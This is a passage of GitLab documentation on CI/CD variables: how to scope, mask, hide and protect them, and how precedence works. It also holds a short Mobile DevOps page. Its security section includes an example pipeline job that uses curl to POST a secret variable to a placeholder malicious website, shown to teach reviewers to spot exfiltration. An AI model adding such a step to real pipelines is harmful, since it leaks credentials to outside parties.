You can make a CI/CD variable available to all projects in a group. Groups can have a maximum of 30000 CI/CD variables.

Prerequisites:

- You must be a group member with the Owner role.

To add a group variable:

1. On the left sidebar, select **Search or go to** and find your group.
2. Select **Settings > CI/CD**.
3. Expand **Variables**.
4. Select **Add variable** and fill in the details:
   - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
   - **Value**: No limitations.
   - **Type**: `Variable` (default) or [`File`](https://docs.gitlab.com/ci/variables/#use-file-type-cicd-variables).
   - **Protect variable** Optional. If selected, the variable is only available in pipelines
     that run on [protected branches](https://docs.gitlab.com/user/project/repository/branches/protected/)
     or [protected tags](https://docs.gitlab.com/user/project/protected_tags/).
   - **Visibility**: Select **Visible** (default), [**Masked**](https://docs.gitlab.com/ci/variables/#mask-a-cicd-variable),
     or [**Masked and hidden**](https://docs.gitlab.com/ci/variables/#hide-a-cicd-variable) (only available for new variables).

The group variables that are available in a project are listed in the project’s
**Settings > CI/CD > Variables** section. Variables from [subgroups](https://docs.gitlab.com/user/group/subgroups/)
are recursively inherited.

#### Environment scope [Permalink](https://docs.gitlab.com/ci/variables/\#environment-scope "Permalink")

- Tier: Premium, Ultimate

To set a group CI/CD variable to only be available for certain environments:

1. On the left sidebar, select **Search or go to** and find your group.
2. Select **Settings > CI/CD**.
3. Expand **Variables**.
4. To the right of the variable, select **Edit** (
pencil).
5. For **Environment scope**, select **All (default)** ( `*`), a specific [environment](https://docs.gitlab.com/ci/environments/#types-of-environments),
or a wildcard [environment scope](https://docs.gitlab.com/ci/environments/#limit-the-environment-scope-of-a-cicd-variable).

### For an instance [Permalink](https://docs.gitlab.com/ci/variables/\#for-an-instance "Permalink")

- Tier: Free, Premium, Ultimate
- Offering: GitLab Self-Managed, GitLab Dedicated

You can make a CI/CD variable available to all projects and groups in a GitLab instance.

Prerequisites:

- You must have administrator access to the instance.

To add an instance variable:

1. On the left sidebar, at the bottom, select **Admin**.
2. Select **Settings > CI/CD**.
3. Expand **Variables**.
4. Select **Add variable** and fill in the details:
   - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
   - **Value**: The value is limited to 10,000 characters, but also bounded by any limits in the
     runner’s operating system.
   - **Type**: `Variable` (default) or [`File`](https://docs.gitlab.com/ci/variables/#use-file-type-cicd-variables).
   - **Protect variable** Optional. If selected, the variable is only available in pipelines
     that run on [protected branches](https://docs.gitlab.com/user/project/repository/branches/protected/)
     or [protected tags](https://docs.gitlab.com/user/project/protected_tags/).
   - **Visibility**: Select **Visible** (default), [**Masked**](https://docs.gitlab.com/ci/variables/#mask-a-cicd-variable),
     or [**Masked and hidden**](https://docs.gitlab.com/ci/variables/#hide-a-cicd-variable) (only available for new variables).

## CI/CD variable security [Permalink](https://docs.gitlab.com/ci/variables/\#cicd-variable-security "Permalink")

Code pushed to the `.gitlab-ci.yml` file could compromise your variables. Variables could
be accidentally exposed in a job log, or maliciously sent to a third party server.

Review all merge requests that introduce changes to the `.gitlab-ci.yml` file before you:

- [Run a pipeline in the parent project for a merge request submitted from a forked project](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/#run-pipelines-in-the-parent-project).
- Merge the changes.

Review the `.gitlab-ci.yml` file of imported projects before you add files or run pipelines against them.

The following example shows malicious code in a `.gitlab-ci.yml` file:

YAML Copy to clipboard

```yaml
accidental-leak-job:
  script:                                         # Password exposed accidentally
    - echo "This script logs into the DB with $USER $PASSWORD"
    - db-login $USER $PASSWORD

malicious-job:
  script:                                         # Secret exposed maliciously
    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
```

To help reduce the risk of accidentally leaking secrets through scripts like in `accidental-leak-job`,
all variables containing sensitive information should always be [masked in job logs](https://docs.gitlab.com/ci/variables/#mask-a-cicd-variable).
You can also [limit a variable to protected branches and tags only](https://docs.gitlab.com/ci/variables/#protect-a-cicd-variable).

Alternatively, use one of the native GitLab integrations to connect with third party
secrets manager providers to store and retrieve secrets:

- [HashiCorp Vault](https://docs.gitlab.com/ci/secrets/)
- [Azure Key Vault](https://docs.gitlab.com/ci/secrets/azure_key_vault/)
- [Google Secret Manager](https://docs.gitlab.com/ci/secrets/gcp_secret_manager/)

You can also use [OpenID Connect (OIDC) authentication](https://docs.gitlab.com/ci/secrets/id_token_authentication/)
for secrets managers which do not have a native integration.

Malicious scripts like in `malicious-job` must be caught during the review process.
Reviewers should never trigger a pipeline when they find code like this, because
malicious code can compromise both masked and protected variables.

Variable values are encrypted using [`aes-256-cbc`](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
and stored in the database. This data can only be read and decrypted with a
valid [secrets file](https://docs.gitlab.com/administration/backup_restore/troubleshooting_backup_gitlab/#when-the-secrets-file-is-lost).

### Mask a CI/CD variable [Permalink](https://docs.gitlab.com/ci/variables/\#mask-a-cicd-variable "Permalink")

Masking a CI/CD variable is not a guaranteed way to prevent malicious users from
accessing variable values. To ensure security of sensitive information,
consider using [external secrets](https://docs.gitlab.com/ci/secrets/) and [file type variables](https://docs.gitlab.com/ci/variables/#use-file-type-cicd-variables)
to prevent commands such as `env`/ `printenv` from printing secret variables.

You can mask a project, group, or instance CI/CD variable so the value of the variable
does not display in job logs. When a masked CI/CD variable would be displayed in a job log,
the value is replaced with `[masked]` to prevent the value from being exposed.

Prerequisites:

- You must have the same role or access level as required to [add a CI/CD variable in the UI](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-ui).

To mask a variable:

1. For the group, project, or in the **Admin** area, select **Settings > CI/CD**.
2. Expand **Variables**.
3. Next to the variable you want to protect, select **Edit**.
4. Under **Visibility**, select **Mask variable**.
5. Select **Update variable**.

The method used to mask variables [limits what can be included in a masked variable](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/13784#note_106756757).
The value of the variable must:

- Be a single line with no spaces.
- Be 8 characters or longer.
- Not match the name of an existing predefined or custom CI/CD variable.
- Not include non-alphanumeric characters other than `@`, `_`, `-`, `:`, or `+`.

Additionally, if [variable expansion](https://docs.gitlab.com/ci/variables/#prevent-cicd-variable-expansion) is enabled,
the value can contain only:

- Characters from the Base64 alphabet (RFC4648).
- The `@`, `:`, `.`, or `~` characters.

Masking a variable automatically masks the value anywhere in a job log. If another
variable has the same value, that value is also masked, including when a variable
references a masked variable. The string `[MASKED]` is shown instead of the value,
possibly with some trailing `x` characters.

Secrets could be revealed when `CI_DEBUG_SERVICES` is enabled. For details, read about [service container logging](https://docs.gitlab.com/ci/services/#capturing-service-container-logs).

### Hide a CI/CD variable [Permalink](https://docs.gitlab.com/ci/variables/\#hide-a-cicd-variable "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/29674) in GitLab 17.4 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_hidden_variables`. Enabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/165843) in GitLab 17.6. Feature flag `ci_hidden_variables` removed.

In addition to masking, you can also prevent the value of CI/CD variables from being revealed
in the **CI/CD** settings page. Hiding a variable is only possible when creating a new variable,
you cannot update an existing variable to be hidden.

Prerequisites:

- You must have the same role or access level as required to [add a CI/CD variable in the UI](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-ui).
- The variable value must match the [requirements for masked variables](https://docs.gitlab.com/ci/variables/#mask-a-cicd-variable).

To hide a variable, select **Masked and hidden** in the **Visibility** section when
you [add a new CI/CD variable in the UI](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-ui).
After you save the variable, the variable can be used in CI/CD pipelines, but cannot
be revealed in the UI again.

### Protect a CI/CD variable [Permalink](https://docs.gitlab.com/ci/variables/\#protect-a-cicd-variable "Permalink")

You can configure a project, group, or instance CI/CD variable to be available
only to pipelines that run on [protected branches](https://docs.gitlab.com/user/project/repository/branches/protected/)
or [protected tags](https://docs.gitlab.com/user/project/protected_tags/).

[Merged results pipelines](https://docs.gitlab.com/ci/pipelines/merged_results_pipelines/) and [merge request pipelines](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/) can optionally [access protected variables](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/#control-access-to-protected-variables-and-runners).

Prerequisites:

- You must have the same role or access level as required to [add a CI/CD variable in the UI](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-ui).

To set a variable as protected:

1. For the project or group, go to **Settings > CI/CD**.
2. Expand **Variables**.
3. Next to the variable you want to protect, select **Edit**.
4. Select the **Protect variable** checkbox.
5. Select **Update variable**.

The variable is available for all subsequent pipelines.

### Use file type CI/CD variables [Permalink](https://docs.gitlab.com/ci/variables/\#use-file-type-cicd-variables "Permalink")

All predefined CI/CD variables and variables defined in the `.gitlab-ci.yml` file
are “variable” type ( [`variable_type` of `env_var` in the API](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-ui)).
Variable type variables:

- Consist of a key and value pair.
- Are made available in jobs as environment variables, with:
  - The CI/CD variable key as the environment variable name.
  - The CI/CD variable value as the environment variable value.

Project, group, and instance CI/CD variables are “variable” type by default, but can
optionally be set as a “file” type ( [`variable_type` of `file` in the API](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-ui)).
File type variables:

- Consist of a key, value, and file.
- Are made available in jobs as environment variables, with:
  - The CI/CD variable key as the environment variable name.
  - The CI/CD variable value saved to a temporary file.
  - The path to the temporary file as the environment variable value.

Use file type CI/CD variables for tools that need a file as input. [The AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-envvars.html)
and [`kubectl`](https://kubernetes.io/docs/concepts/configuration/organize-cluster-access-kubeconfig/#the-kubeconfig-environment-variable)
are both tools that use `File` type variables for configuration.

For example, if you are using `kubectl` with:

- A variable with a key of `KUBE_URL` and `https://example.com` as the value.
- A file type variable with a key of `KUBE_CA_PEM` and a certificate as the value.

Pass `KUBE_URL` as a `--server` option, which accepts a variable, and pass `$KUBE_CA_PEM`
as a `--certificate-authority` option, which accepts a path to a file:

Shell Copy to clipboard

```shell
kubectl config set-cluster e2e --server="$KUBE_URL" --certificate-authority="$KUBE_CA_PEM"
```

#### Use a `.gitlab-ci.yml` variable as a file type variable [Permalink](https://docs.gitlab.com/ci/variables/\#use-a-gitlab-ciyml-variable-as-a-file-type-variable "Permalink")

You cannot set a CI/CD variable [defined in the `.gitlab-ci.yml` file](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-gitlab-ciyml-file)
as a file type variable. If you have a tool that requires a file path as an input,
but you want to use a variable defined in the `.gitlab-ci.yml`:

- Run a command that saves the value of the variable in a file.
- Use that file with your tool.

For example:

YAML Copy to clipboard

```yaml
variables:
  SITE_URL: "https://gitlab.example.com"

job:
  script:
    - echo "$SITE_URL" > "site-url.txt"
    - mytool --url-file="site-url.txt"
```

## Prevent CI/CD variable expansion [Permalink](https://docs.gitlab.com/ci/variables/\#prevent-cicd-variable-expansion "Permalink")

Expanded variables treat values with the `$` character as a reference to another variable.
CI/CD variables are expanded by default. To treat variables with a `$` character as raw strings,
disable variable expansion for the variable

Prerequisites:

- You must have the same role or access level as required to [add a CI/CD variable in the UI](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-ui).

To disable variable expansion for the variable:

1. For the project or group, go to **Settings > CI/CD**.
2. Expand **Variables**.
3. Next to the variable you want to do not want expanded, select **Edit**.
4. Clear the **Expand variable** checkbox.
5. Select **Update variable**.

## CI/CD variable precedence [Permalink](https://docs.gitlab.com/ci/variables/\#cicd-variable-precedence "Permalink")

History

- Scan Execution Policies variable precedence was [changed](https://gitlab.com/gitlab-org/gitlab/-/issues/424028) in GitLab 16.7 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `security_policies_variables_precedence`. Enabled by default. [Feature flag removed in GitLab 16.8](https://gitlab.com/gitlab-org/gitlab/-/issues/435727).

You can use CI/CD variables with the same name in different places, but the values
can overwrite each other. The type of variable and where they are defined determines
which variables take precedence.

The order of precedence for variables is (from highest to lowest):

01. [Pipeline execution policy variables](https://docs.gitlab.com/user/application_security/policies/pipeline_execution_policies/#cicd-variables).
02. [Scan execution policy variables](https://docs.gitlab.com/user/application_security/policies/scan_execution_policies/).
03. [Pipeline variables](https://docs.gitlab.com/ci/variables/#use-pipeline-variables). These variables all have the same precedence:
    - [Variables passed to downstream pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#pass-cicd-variables-to-a-downstream-pipeline).
    - [Trigger variables](https://docs.gitlab.com/ci/triggers/#pass-cicd-variables-in-the-api-call).
    - [Scheduled pipeline variables](https://docs.gitlab.com/ci/pipelines/schedules/#add-a-pipeline-schedule).
    - [Manual pipeline run variables](https://docs.gitlab.com/ci/pipelines/#run-a-pipeline-manually).
    - Variables added when [creating a pipeline with the API](https://docs.gitlab.com/api/pipelines/#create-a-new-pipeline).
    - [Manual job variables](https://docs.gitlab.com/ci/jobs/job_control/#specify-variables-when-running-manual-jobs).
04. Project [variables](https://docs.gitlab.com/ci/variables/#for-a-project).
05. Group [variables](https://docs.gitlab.com/ci/variables/#for-a-group). If the same variable name exists in a
    group and its subgroups, the job uses the value from the closest subgroup. For example, if
    you have `Group > Subgroup 1 > Subgroup 2 > Project`, the variable defined in
    `Subgroup 2` takes precedence.
06. Instance [variables](https://docs.gitlab.com/ci/variables/#for-an-instance).
07. [Variables from `dotenv` reports](https://docs.gitlab.com/ci/variables/job_scripts/#pass-an-environment-variable-to-another-job).
08. Job variables, defined in jobs in the `.gitlab-ci.yml` file.
09. Default variables for all jobs, defined at the top-level of the `.gitlab-ci.yml` file.
10. [Deployment variables](https://docs.gitlab.com/ci/variables/predefined_variables/#deployment-variables).
11. [Predefined variables](https://docs.gitlab.com/ci/variables/predefined_variables/).

For example:

YAML Copy to clipboard

```yaml
variables:
  API_TOKEN: "default"

job1:
  variables:
    API_TOKEN: "secure"
  script:
    - echo "The variable is '$API_TOKEN'"
```

In this example, `job1` outputs `The variable is 'secure'` because variables defined in jobs in the `.gitlab-ci.yml` file
have higher precedence than default variables.

## Use pipeline variables [Permalink](https://docs.gitlab.com/ci/variables/\#use-pipeline-variables "Permalink")

Pipeline variables are variables that are specified when running a new pipeline.

Prerequisites:

- You must have the Developer role in the project.

You can specify a pipeline variable when you:

- [Run a pipeline manually](https://docs.gitlab.com/ci/pipelines/#run-a-pipeline-manually) in the UI.
- Create a pipeline by using [the `pipelines` API endpoint](https://docs.gitlab.com/api/pipelines/#create-a-new-pipeline).
- Create a pipeline by using [the `triggers` API endpoint](https://docs.gitlab.com/ci/triggers/#pass-cicd-variables-in-the-api-call).
- Use [push options](https://docs.gitlab.com/topics/git/commit/#push-options-for-gitlab-cicd).
- Pass variables to a downstream pipeline by using either the [`variables` keyword](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#pass-cicd-variables-to-a-downstream-pipeline),
[`trigger:forward` keyword](https://docs.gitlab.com/ci/yaml/#triggerforward) or [`dotenv` variables](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#pass-dotenv-variables-created-in-a-job).

These variables have [higher precedence](https://docs.gitlab.com/ci/variables/#cicd-variable-precedence) and can override
other defined variables, including [predefined variables](https://docs.gitlab.com/ci/variables/predefined_variables/).

You should avoid overriding predefined variables in most cases, as it can cause the pipeline to behave unexpectedly.

In [GitLab 17.7](https://docs.gitlab.com/update/deprecations/#increased-default-security-for-use-of-pipeline-variables)
and later, [pipeline inputs](https://docs.gitlab.com/ci/inputs/#for-a-pipeline) are recommended over passing pipeline variables.
For enhanced security, you should [disable pipeline variables](https://docs.gitlab.com/ci/variables/#restrict-pipeline-variables) when using inputs.

### Restrict pipeline variables [Permalink](https://docs.gitlab.com/ci/variables/\#restrict-pipeline-variables "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/440338) in GitLab 17.1.
- For GitLab.com, setting defaults [updated for all new projects in new namespaces](https://gitlab.com/gitlab-org/gitlab/-/issues/502382)
to `no_one_allowed` for `ci_pipeline_variables_minimum_override_role` in GitLab 17.7.

You can limit who can [run pipelines with pipeline variables](https://docs.gitlab.com/ci/variables/#use-pipeline-variables)
to specific user roles. When users with a lower role try to use pipeline variables,
they receive an `Insufficient permissions to set pipeline variables` error message.

Prerequisites:

- You must have the Maintainer role in the project. If the minimum role was previously set to `owner`
or `no_one_allowed`, then you must have the Owner role in the project.

To limit the use of pipeline variables to only the Maintainer role and higher:

- Go to **Settings > CI/CD > Variables**.
- Under **Minimum role to use pipeline variables**, select one of:
  - `no_one_allowed`: No pipelines can run with pipeline variables.
    Default for new projects in new namespaces on GitLab.com.
  - `owner`: Only users with the Owner role can run pipelines with pipeline variables.
    You must have the Owner role for the project to change the setting to this value.
  - `maintainer`: Only users with at least the Maintainer role can run pipelines with pipeline variables.
    Default when not specified on GitLab Self-Managed and GitLab Dedicated.
  - `developer`: Only users with at least the Developer role can run pipelines with pipeline variables.

You can also use [the projects API](https://docs.gitlab.com/api/projects/#edit-a-project) to set
the role for the `ci_pipeline_variables_minimum_override_role` setting.

This restriction does not affect the use of CI/CD variables from the project or group settings.
Most jobs can still use the `variables` keyword in the YAML configuration, but not
jobs that use the `trigger` keyword to trigger downstream pipelines. Trigger jobs
pass variables to a downstream pipelines as pipeline variables, which is also controlled
by this setting.

## Exporting variables [Permalink](https://docs.gitlab.com/ci/variables/\#exporting-variables "Permalink")

Scripts executed in separate shell contexts do not share exports, aliases,
local function definitions, or any other local shell updates.

This means that if a job fails, variables created by user-defined scripts are not
exported.

When runners execute jobs defined in `.gitlab-ci.yml`:

- Scripts specified in `before_script` and the main script are executed together in
a single shell context, and are concatenated.
- Scripts specified in `after_script` run in a shell context completely separate to
the `before_script` and the specified scripts.

Regardless of the shell the scripts are executed in, the runner output includes:

- Predefined variables.
- Variables defined in:
  - Instance, group, or project CI/CD settings.
  - The `.gitlab-ci.yml` file in the `variables:` section.
  - The `.gitlab-ci.yml` file in the `secrets:` section.
  - The `config.toml`.

The runner cannot handle manual exports, shell aliases, and functions executed in the body of the script, like `export MY_VARIABLE=1`.

For example, in the following `.gitlab-ci.yml` file, the following scripts are defined:

YAML Copy to clipboard

```yaml
job:
 variables:
   JOB_DEFINED_VARIABLE: "job variable"
 before_script:
   - echo "This is the 'before_script' script"
   - export MY_VARIABLE="variable"
 script:
   - echo "This is the 'script' script"
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
 after_script:
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
```

When the runner executes the job:

1. `before_script` is executed:
1. Prints to the output.
2. Defines the variable for `MY_VARIABLE`.
2. `script` is executed:
1. Prints to the output.
2. Prints the value of `JOB_DEFINED_VARIABLE`.
3. Prints the value of `CI_COMMIT_SHA`.
4. Prints the value of `MY_VARIABLE`.
3. `after_script` is executed in a new, separate shell context:
1. Prints to the output.
2. Prints the value of `JOB_DEFINED_VARIABLE`.
3. Prints the value of `CI_COMMIT_SHA`.
4. Prints an empty value of `MY_VARIABLE`. The variable value cannot be detected because `after_script` is in a separate shell context to `before_script`.

## Related topics [Permalink](https://docs.gitlab.com/ci/variables/\#related-topics "Permalink")

- You can configure [Auto DevOps](https://docs.gitlab.com/topics/autodevops/) to pass CI/CD variables
to a running application. To make a CI/CD variable available as an environment variable in the running application’s container,
[prefix the variable key](https://docs.gitlab.com/topics/autodevops/cicd_variables/#configure-application-secret-variables)
with `K8S_SECRET_`.

- The [Managing the Complex Configuration Data Management Monster Using GitLab](https://www.youtube.com/watch?v=v4ZOJ96hAck)
video is a walkthrough of the [Complex Configuration Data Monorepo](https://gitlab.com/guided-explorations/config-data-top-scope/config-data-subscope/config-data-monorepo)
working example project. It explains how multiple levels of group CI/CD variables
can be combined with environment-scoped project variables for complex configuration
of application builds or deployments.

The example can be copied to your own group or instance for testing. More details
on what other GitLab CI patterns are demonstrated are available at the project page.

- You can [pass CI/CD variables to downstream pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#pass-cicd-variables-to-a-downstream-pipeline).
Use [`trigger:forward` keyword](https://docs.gitlab.com/ci/yaml/#triggerforward) to specify what type of variables
to pass to the downstream pipeline.


## Help & feedback

[Edit this page](https://gitlab.com/gitlab-org/gitlab/-/blob/master/doc/ci/variables/_index.md)

[Suggest updates](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Documentation)

[Request support](https://about.gitlab.com/support/)

[View pricing](https://about.gitlab.com/pricing/)

[Try GitLab for free](https://about.gitlab.com/free-trial/)

[Post on the GitLab forum](https://forum.gitlab.com/new-topic?title=topic%20title&body=topic%20body&tags=docs-feedback)

![Company Logo](https://cdn.cookielaw.org/logos/aa14a5c8-79e3-442a-8177-464ad850b19d/e46c1d0d-1f66-481f-bc06-5427671431da/253e6fee-c4c0-4b60-bc35-79cdae5dda32/gitlab-logo-100.png)

## Privacy Preference Center

## Privacy Preference Center

- ### Your Privacy

- ### Strictly Necessary Cookies

- ### Functionality Cookies

- ### Performance and Analytics Cookies

- ### Targeting and Advertising Cookies

- ### Ad User Data

- ### Ad Personalization


#### Your Privacy

When you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies. This information might be about you, your preferences or your device and is mostly used to make the site work as you expect it to. The information does not usually directly identify you, but it can give you a more personalized web experience. Because we respect your right to privacy, you can choose not to allow some types of cookies. Click on the different category headings to find out more and change our default settings. However, blocking some types of cookies may impact your experience of the site and the services we are able to offer.


[Cookie Policy](https://about.gitlab.com/privacy/cookies/)

User ID:  01385a8f-b89f-406c-a00f-26ef1162749f

This User ID will be used as a unique identifier while storing and accessing your preferences for future.

Timestamp:  --

#### Strictly Necessary Cookies

Always Active

These cookies are necessary for the website to function and cannot be switched off in our systems. They are usually only set in response to actions made by you which amount to a request for services, such as setting your privacy preferences, enabling you to securely log into the site, filling in forms, or using the customer checkout. GitLab processes any personal data collected through these cookies on the basis of our legitimate interest.

Cookies Details‎

#### Functionality Cookies

Functionality Cookies

These cookies enable helpful but non-essential website functions that improve your website experience. By recognizing you when you return to our website, they may, for example, allow us to personalize our content for you or remember your preferences. If you do not allow these cookies then some or all of these services may not function properly. GitLab processes any personal data collected through these cookies on the basis of your consent

Cookies Details‎

#### Performance and Analytics Cookies

Performance and Analytics Cookies

These cookies allow us and our third-party service providers to recognize and count the number of visitors on our websites and to see how visitors move around our websites when they are using it. This helps us improve our products and ensures that users can easily find what they need on our websites. These cookies usually generate aggregate statistics that are not associated with an individual. To the extent any personal data is collected through these cookies, GitLab processes that data on the basis of your consent.

Cookies Details‎

#### Targeting and Advertising Cookies

Targeting and Advertising Cookies

These cookies enable different advertising related functions. They may allow us to record information about your visit to our websites, such as pages visited, links followed, and videos viewed so we can make our websites and the advertising displayed on it more relevant to your interests. They may be set through our website by our advertising partners. They may be used by those companies to build a profile of your interests and show you relevant advertisements on other websites. GitLab processes any personal data collected through these cookies on the basis of your consent.

Cookies Details‎

#### Ad User Data

Ad User Data

Sets consent for sending user data to Google for advertising purposes.

Cookies Details‎

#### Ad Personalization

Ad Personalization

Sets consent for personalized advertising.

Cookies Details‎

Back Button

### Cookie List

Filter Button

ConsentLeg.Interest

checkbox labellabel

checkbox labellabel

checkbox labellabel

Clear

checkbox labellabel

ApplyCancel

Confirm My Choices

Allow All

[![Powered by Onetrust](https://cdn.cookielaw.org/logos/static/powered_by_logo.svg)](https://www.onetrust.com/products/cookie-consent/)

---


## 7. Mobile DevOps {#section-7}

*Source: [https://docs.gitlab.com/ee/ci/mobile_devops.html](https://docs.gitlab.com/ee/ci/mobile_devops.html)*

# Mobile DevOps

- Tier: Free, Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

Build, sign, and release native and cross-platform mobile apps for Android and iOS by using GitLab CI/CD.
GitLab Mobile DevOps provides tools and best practices to automate your mobile app development workflow.

GitLab Mobile DevOps integrates key mobile development capabilities into the GitLab DevSecOps platform:

- Build environments for iOS and Android development
- Secure code signing and certificate management
- App store distribution for Google Play and Apple App Store

## Build environments [Permalink](https://docs.gitlab.com/ci/mobile_devops/\#build-environments "Permalink")

For complete control over the build environment, you can use [GitLab-hosted runners](https://docs.gitlab.com/ci/runners/),
or set up [self-managed runners](https://docs.gitlab.com/runner/#use-self-managed-runners).

## Code signing [Permalink](https://docs.gitlab.com/ci/mobile_devops/\#code-signing "Permalink")

All Android and iOS apps must be securely signed before being distributed through
the various app stores. Signing ensures that applications haven’t been tampered with
before reaching a user’s device.

With [project-level secure files](https://docs.gitlab.com/ci/secure_files/), you can store the following
in GitLab, so that they can be used to securely sign apps in CI/CD builds:

- Keystores
- Provision profiles
- Signing certificates

For an overview, see [Project-level secure files demo](https://youtu.be/O7FbJu3H2YM).

## Distribution [Permalink](https://docs.gitlab.com/ci/mobile_devops/\#distribution "Permalink")

Signed builds can be uploaded to the Google Play Store or Apple App Store by using
the Mobile DevOps Distribution integrations.

## Related topics [Permalink](https://docs.gitlab.com/ci/mobile_devops/\#related-topics "Permalink")

For step-by-step guidance on implementing Mobile DevOps, see:

- [Tutorial: Build Android apps with GitLab Mobile DevOps](https://docs.gitlab.com/ci/mobile_devops/mobile_devops_tutorial_android/)
- [Tutorial: Build iOS apps with GitLab Mobile DevOps](https://docs.gitlab.com/ci/mobile_devops/mobile_devops_tutorial_ios/)

## Help & feedback

[Edit this page](https://gitlab.com/gitlab-org/gitlab/-/blob/master/doc/ci/mobile_devops/_index.md)

[Suggest updates](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Documentation)

[Request support](https://about.gitlab.com/support/)

[View pricing](https://about.gitlab.com/pricing/)

[Try GitLab for free](https://about.gitlab.com/free-trial/)

[Post on the GitLab forum](https://forum.gitlab.com/new-topic?title=topic%20title&body=topic%20body&tags=docs-feedback)

![Company Logo](https://cdn.cookielaw.org/logos/aa14a5c8-79e3-442a-8177-464ad850b19d/e46c1d0d-1f66-481f-bc06-5427671431da/253e6fee-c4c0-4b60-bc35-79cdae5dda32/gitlab-logo-100.png)

## Privacy Preference Center

## Privacy Preference Center

- ### Your Privacy

- ### Strictly Necessary Cookies

- ### Functionality Cookies

- ### Performance and Analytics Cookies

- ### Targeting and Advertising Cookies

- ### Ad User Data

- ### Ad Personalization


#### Your Privacy

When you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies. This information might be about you, your preferences or your device and is mostly used to make the site work as you expect it to. The information does not usually directly identify you, but it can give you a more personalized web experience. Because we respect your right to privacy, you can choose not to allow some types of cookies. Click on the different category headings to find out more and change our default settings. However, blocking some types of cookies may impact your experience of the site and the services we are able to offer.


[Cookie Policy](https://about.gitlab.com/privacy/cookies/)

User ID:  265b6c11-7589-4463-832d-7362856aa03a

This User ID will be used as a unique identifier while storing and accessing your preferences for future.

Timestamp:  --

#### Strictly Necessary Cookies

Always Active

These cookies are necessary for the website to function and cannot be switched off in our systems. They are usually only set in response to actions made by you which amount to a request for services, such as setting your privacy preferences, enabling you to securely log into the site, filling in forms, or using the customer checkout. GitLab processes any personal data collected through these cookies on the basis of our legitimate interest.

Cookies Details‎

#### Functionality Cookies

Functionality Cookies

These cookies enable helpful but non-essential website functions that improve your website experience. By recognizing you when you return to our website, they may, for example, allow us to personalize our content for you or remember your preferences. If you do not allow these cookies then some or all of these services may not function properly. GitLab processes any personal data collected through these cookies on the basis of your consent

Cookies Details‎

#### Performance and Analytics Cookies

Performance and Analytics Cookies

These cookies allow us and our third-party service providers to recognize and count the number of visitors on our websites and to see how visitors move around our websites when they are using it. This helps us improve our products and ensures that users can easily find what they need on our websites. These cookies usually generate aggregate statistics that are not associated with an individual. To the extent any personal data is collected through these cookies, GitLab processes that data on the basis of your consent.

Cookies Details‎

#### Targeting and Advertising Cookies

Targeting and Advertising Cookies

These cookies enable different advertising related functions. They may allow us to record information about your visit to our websites, such as pages visited, links followed, and videos viewed so we can make our websites and the advertising displayed on it more relevant to your interests. They may be set through our website by our advertising partners. They may be used by those companies to build a profile of your interests and show you relevant advertisements on other websites. GitLab processes any personal data collected through these cookies on the basis of your consent.

Cookies Details‎

#### Ad User Data

Ad User Data

Sets consent for sending user data to Google for advertising purposes.

Cookies Details‎

#### Ad Personalization

Ad Personalization

Sets consent for personalized advertising.

Cookies Details‎

Back Button

### Cookie List

Filter Button

ConsentLeg.Interest

checkbox labellabel

checkbox labellabel

checkbox labellabel

Clear

checkbox labellabel

ApplyCancel

Confirm My Choices

Allow All

[![Powered by Onetrust](https://cdn.cookielaw.org/logos/static/powered_by_logo.svg)](https://www.onetrust.com/products/cookie-consent/)

---


## 8. GitLab CI/CD examples {#section-8}

*Source: [https://docs.gitlab.com/ee/ci/examples/](https://docs.gitlab.com/ee/ci/examples/)*

# GitLab CI/CD examples

- Tier: Free, Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

This page contains links to a variety of examples that can help you understand how to
implement [GitLab CI/CD](https://docs.gitlab.com/ci/) for your specific use case.

Examples are available in several forms. As a collection of:

- `.gitlab-ci.yml` [template files](https://docs.gitlab.com/ci/examples/#cicd-templates) maintained in GitLab, for many
common frameworks and programming languages.
- Repositories with [example projects](https://gitlab.com/gitlab-examples) for various languages. You can fork and adjust them to your own needs. Projects include an example of using [review apps with a static site served by NGINX](https://gitlab.com/gitlab-examples/review-apps-nginx/).
- Examples and [other resources](https://docs.gitlab.com/ci/examples/#other-resources) listed in the following sections.

## CI/CD examples [Permalink](https://docs.gitlab.com/ci/examples/\#cicd-examples "Permalink")

